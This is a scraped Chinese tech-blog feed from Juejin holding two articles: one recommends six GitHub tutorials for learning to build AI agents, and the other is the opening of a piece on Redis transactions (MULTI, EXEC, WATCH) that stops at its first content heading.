            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    逛逛GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:46:15.000Z" title="Wed Dec 10 2025 02:46:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025年，毫无疑问将是 Agent（智能体）元年，GitHub 上无疑是非常重要的一个学习平台，上面有很多宝藏教程。今天推荐几个 Agent 学习开源项，，感兴趣的可以先收藏本文，方便后面回顾。</p>
<h2 data-id="heading-0">01、Hello-Agents</h2>
<p>国内社区 Datawhale 开源的教程，GitHub 上有 5700+ Star。</p>
<p>这个教程既能带你深入底层原理，又能手把手带你写出能跑的 Agent 代码。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/487c29c55b984dae8773370c97298000~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=cmN339PLXZrz9D8ZH8FSjqEUcLQ%3D" alt="图片" loading="lazy"/></p>
<p>它不仅仅是一个代码仓库，更像是一本<strong>互动式的教科书</strong>。帮你从一名大模型的使用者，蜕变为一名智能体系统的构建者。</p>
<p>这个开源项目内容很丰富，不像很多教程上来就让你调 LangChain 的接口。</p>
<p>Hello-Agents 非常硬核，它会带你手搓框架：不依赖现成库，用原生OpenAI API 从零构建一个 Agent 框架。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e306cbb9c6c44fddb7f563ee2db16952~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=nWRdKKhwAYKrO7%2F7HFGoQR0B4lI%3D" alt="图片" loading="lazy"/></p>
<p>彻底理解 ReAct（推理+行动）、Plan-and-Solve、Reflection（反思）这些经典范式是如何在代码层面实现的。</p>
<p>只有当你亲手造过轮子，你才能真正理解轮子是怎么转的。</p>
<p>另外这个开源项目还教你使用 Coze、Dify、n8n 等平台快速搭建应用，适合快速验证想法。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/230369ab362d4d0d9d4f1148a74928ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=9x7cR9SOrwm%2FMI21myKzs55HKEA%3D" alt="图片" loading="lazy"/></p>
<p>除此之外，Hello-Agents 还能深入 LangGraph 等主流框架，讲解如何用代码控制复杂的 Agent 工作流。</p>
<p>还教你如何让 Agent 拥有长期记忆；实现多智能体协作 (Multi-Agent)；了解 RAG 与上下文工程，让 Agent 精准利用外部知识库。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e992adf13001438a80e34d647c0aacde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=LWapZ%2FM%2BDI7QxF6eMwlu5apz5V0%3D" alt="图片" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/datawhalechina/hello-agents</span>
</code></pre>
<h2 data-id="heading-1">02、500+ 智能体案例</h2>
<p>500-AI-Agents-Projects 是 GitHub 上一个涵盖了超过 500 个 AI Agent 落地案例的超级目录，斩获 18k+ Star。</p>
<p>与纯粹的代码教程不同，它更像是一本行业应用指南，按医疗、金融、教育、DevOps 等垂直领域对 Agent 项目进行了详细分类。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d8ccdbe42104cb5b3e79e887d708402~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=Kptd7waeZ%2BwEQ9o0Py65OkaWECg%3D" alt="图片" loading="lazy"/></p>
<p>开源项目收录了大量开源代码和实际用例，无论你是想开发一个自动化营销助手，还是医疗诊断辅助系统，都能在这里找到现成的参考案例。</p>
<p>帮助开发者和产品经理跳出聊天机器人的思维定势，发现 AI 在细分领域的落地。</p>
<p>包括 CrewAI、Autogen、Agno、Langgraph 等主流框架的实际应用。<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b262da028db4889be74554fe8e3191c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=I5RS5unp2ZwagRhba3RP%2BI2BJSk%3D" alt="图片" loading="lazy"/></p>
<p>如果你想知道别人都在用 AI Agent 搞什么，或者想在动手开发前参考现有的最佳实践以避免重复造轮子，那么来这个仓库瞧瞧就行了。</p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/ashishpatel26/500-AI-Agents-Projects</span>
</code></pre>
<h2 data-id="heading-2">03、智能体资源库</h2>
<p>国外 AI 技术博主 <strong>Nir Diamant</strong> 大佬开源的：<strong>GenAI_Agents</strong>。</p>
<p>通过极其清晰的路径，手把手教你从零构建智能体。汇集了 <strong>40 多种不同场景的 AI 智能体实现，</strong></p>
<p>无论你是想做一个简单的问答机器人，还是想利用当红框架 <strong>LangGraph</strong> 搭建复杂的、具备记忆和自我反思能力的多智能体系统，这里都有现成的最佳实践。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5002e0eed58f4210932255288228e99c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=6Nnep1GHL6sEVbTBZ43rhTtXMLw%3D" alt="图片" loading="lazy"/></p>
<p>这个项目最大的亮点在于实战为王，包含了大量可直接运行的 Jupyter Notebook 教程，覆盖了从入门到精通的全方位场景。</p>
<p>项目按难度分级，新手可以从基础对话 Agent 入手，逐步进阶到复杂的多智能体系统架构。</p>
<p>每个智能体都提供完整的实现代码和详细说明，你可以直接克隆项目，快速复现效果。</p>
<p>集成了 LangChain、LangGraph、AutoGen 等主流框架，以及 MCP 等先进技术。</p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/NirDiamant/GenAI_Agents</span>
</code></pre>
<h2 data-id="heading-3">04、HF开源的 Agent 教程</h2>
<p>Hugging Face 官方开源了他们的智能体课程：Agents Course。</p>
<p>当你完成所有章节和 Final Project 后，你还能获得一张 <strong>Hugging Face 官方颁发的结业证书</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6faf174e6cab4db68ebce3795689466c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=%2FmlKaqcqRPfCNS%2Fr%2Fazi2As1CGU%3D" alt="图片" loading="lazy"/></p>
<p>我发现 Hugging Face 确实是在通过这门课推广新框架 smolagents。</p>
<p>他们发现现在的 Agent 开发越来越重了，动不动就是复杂的图、复杂的 Chain。它的核心理念是：<strong>Code Agents</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a6ea321eba348d4980f89fc3683a98f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=4T%2Bldjvo4%2BMvHjSBgWVxHbJruTk%3D" alt="图片" loading="lazy"/></p>
<p>简单说，<strong>让 LLM 直接写 Python 代码来解决问题</strong>，而不是让它输出一堆复杂的 JSON 格式去调用工具。</p>
<p>这种方式更直观、更强大，而且代码量只有其他框架的几分之一。这门课会带你掌握这种小而美的开发方式。</p>
<p>同样的，这个 Agents 项目也包含极其有趣的实战案例，教你训练一个能玩宝可梦游戏的智能体。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/685f48cb3d764e4cbe50bcc84085a8ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=p3cyFDMuGm5V%2B2lEI52Z2tQ9khc%3D" alt="图片" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/></p>
<p>依托于 Hugging Face 强大的生态，这门课所有的练习都可以在 Hugging Face Spaces 上直接运行。</p>
<p>你甚至不需要自己在本地配环境，浏览器点开就能跑，还能直接用 HF 提供的免费 Inference API。</p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/huggingface/agents-course</span>
</code></pre>
<h2 data-id="heading-4">05、微软开源的 Agents 教程</h2>
<p>继《机器学习入门》、《生成式 AI 入门》等神级教程火遍全球后，<strong>微软也对 Agent 下手了。</strong></p>
<p><strong>微软推出的 AI Agents for Beginners</strong> 已经 5 万的 Star </p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/846d1d3f5f5942b6986b2b722dce2e38~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=p5eIOwaM0cLR99%2FY2tdHg%2FfJ0hc%3D" alt="图片" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/></p>
<p>这是面向初学者的 10 节智能体开发课程，不同于市面上零散的教程，微软把<strong>企业级开发</strong>中验证过的模式和框架，通过 10 节循序渐进的课程，手把手教给你。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a7b40282bc243178f4d40027a0f3580~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=UJnMog5uF6V35TUS7ODZwhiC7Zo%3D" alt="图片" loading="lazy"/></p>
<p>这个课程会学习微软主推的 SDK Semantic Kernel，专注于将大模型集成到现有代码中，企业级应用的首选。还会应用处理复杂 Multi-Agent 协作的开源框架 AutoGen。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/381faafaa7b744c3864c4a35596ac6c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=nJYb6OondjScKNStkoyXOaTPtvk%3D" alt="图片" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/microsoft/ai-agents-for-beginners</span>
</code></pre>
<h2 data-id="heading-5">06、6周学会AI智能体</h2>
<p>课程导师是 Ed Donner ，通过为期 <strong>6 周</strong>的实践学习，引导你掌握如何构建和部署自主 AI 智能体。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/daa7441fe1dd4238a3f5b4973a3542ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=vvLyG2jo06AnodHaZPFdsZlNWKM%3D" alt="图片" loading="lazy"/></p>
<p>该项目最大的价值在于全框架覆盖<strong>与</strong>前沿技术跟进。它不仅横向对比并实战了 OpenAI Agents SDK、CrewAI、LangGraph、AutoGen 四大主流框架，还率先涵盖了最新的 <strong>MCP</strong>。而且你可以直接在 Cursor 里面学这个课程。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fb56bde49b346da9e97710dfb2015cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=RjXl9bUJhA%2Ff1xf0aiTOpS2TdPM%3D" alt="图片" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/ed-donner/agents</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Redis事务机制深度剖析：MULTI、EXEC与WATCH命令实战]]></title>    <link>https://juejin.cn/post/7581698635866701850</link>    <guid>https://juejin.cn/post/7581698635866701850</guid>    <pubDate>2025-12-10T02:38:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581698635866701850" data-draft-id="7490815158190145562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Redis事务机制深度剖析：MULTI、EXEC与WATCH命令实战"/> <meta itemprop="keywords" content="Redis,数据库,性能优化"/> <meta itemprop="datePublished" content="2025-12-10T02:38:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Go高并发架构_王工"/> <meta itemprop="url" content="https://juejin.cn/user/446863555701561"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Redis事务机制深度剖析：MULTI、EXEC与WATCH命令实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/446863555701561/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Go高并发架构_王工
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:38:14.000Z" title="Wed Dec 10 2025 02:38:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读25分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">文章摘要（200-300字）</h2>
<p>Redis 作为一款高性能的内存数据库，以其极致的速度和灵活的数据结构广受开发者青睐。然而，在并发场景下，如何保证数据一致性成为一个绕不开的话题。Redis 的事务机制通过 <code>MULTI</code>、<code>EXEC</code> 和 <code>WATCH</code> 命令，提供了一种轻量级的解决方案，虽然它不像传统关系型数据库那样支持完整的事务特性，却在特定场景下展现出独特优势。本文旨在深入剖析 Redis 事务的核心原理，帮助读者理解其工作机制、适用场景以及潜在局限。无论是使用 <code>MULTI</code> 和 <code>EXEC</code> 实现原子操作，还是借助 <code>WATCH</code> 实现乐观锁并发控制，我们都将结合实际项目经验，辅以代码示例和踩坑教训，带你从基础走向实战。文章特色在于：不仅讲解技术细节，还分享了作者在订单处理、库存扣减等场景中的实战心得，力求让每一位有 1-2 年 Redis 经验的开发者都能快速上手并优化自己的项目。无论你是想提升技能，还是解决实际问题，这篇文章都将是你的得力助手。</p>
<hr/>
<h2 data-id="heading-1">一、引言（约400-500字）</h2>
<h3 data-id="heading-2">1. Redis事务的背景与价值</h3>
<p>Redis 诞生于内存数据库的黄金时代，它的定位是“快而灵活”。凭借毫秒级的响应速度和丰富的数据结构，Redis 在缓存、队列、计数器等场景中大放异彩。然而，当业务逻辑涉及多个操作需要“要么全成功，要么全失败”时，单命令的原子性就显得捉襟见肘了。这时候，Redis 的事务机制应运而生。</p>
<p>与传统关系型数据库（如 MySQL）的事务相比，Redis 的事务更像是一个“轻装上阵”的助手。它不提供完整的 ACID（原子性、一致性、隔离性、持久性）保证，而是通过命令队列和延迟执行，实现了有限的原子性支持。这种设计牺牲了部分功能（如回滚），换来了更高的性能和更低的复杂度。试想一下，在一个电商系统中，库存扣减和订单生成必须同时完成，Redis 的事务就能派上用场。它适用于轻量级原子操作，比如批量更新缓存、积分累加、库存管理等场景。</p>
<h3 data-id="heading-3">2. 目标读者与文章结构</h3>
<p>如果你已经使用 Redis 1-2 年，熟悉基本命令但对事务机制还停留在“听说过”的阶段，这篇文章正是为你量身打造的。我们希望通过由浅入深的讲解，帮助你不仅理解 <code>MULTI</code>、<code>EXEC</code> 和 <code>WATCH</code> 的原理，还能在项目中自信地应用它们。</p>
<p>文章将从基础知识开始，逐步深入到核心命令的剖析，再到实战案例和优化技巧。具体结构如下：</p>
<ul>
<li><strong>基础篇</strong>：带你认识 Redis 事务的本质和基本用法。</li>
<li><strong>剖析篇</strong>：拆解 <code>MULTI</code> 和 <code>EXEC</code> 的工作原理，揭示其优势与局限。</li>
<li><strong>实战篇</strong>：聚焦 <code>WATCH</code> 的乐观锁特性，结合库存扣减等场景实战演练。</li>
<li><strong>高级篇</strong>：探讨事务与 Lua 脚本的对比，以及分布式环境下的优化。</li>
<li><strong>经验篇</strong>：分享真实项目中的踩坑教训和最佳实践。</li>
<li><strong>总结篇</strong>：提炼核心要点并展望未来。</li>
</ul>
<p>从理论到实践，我们将用代码和经验为你铺平学习之路。接下来，让我们从 Redis 事务的基础开始，逐步揭开它的神秘面纱。</p>
<hr/>
<h2 data-id="heading-4">二、Redis事务机制基础（约600-800字）</h2>
<p>Redis 的事务机制虽然不像传统数据库那样复杂，但它却是 Redis 在并发场景下的一把“利器”。本章将带你从零开始认识 Redis 事务的核心概念和基本用法，为后续的深入剖析打下坚实基础。无论你是想快速上手，还是为实战做准备，这里都会给你一个清晰的起点。</p>
<h3 data-id="heading-5">1. 什么是Redis事务？</h3>
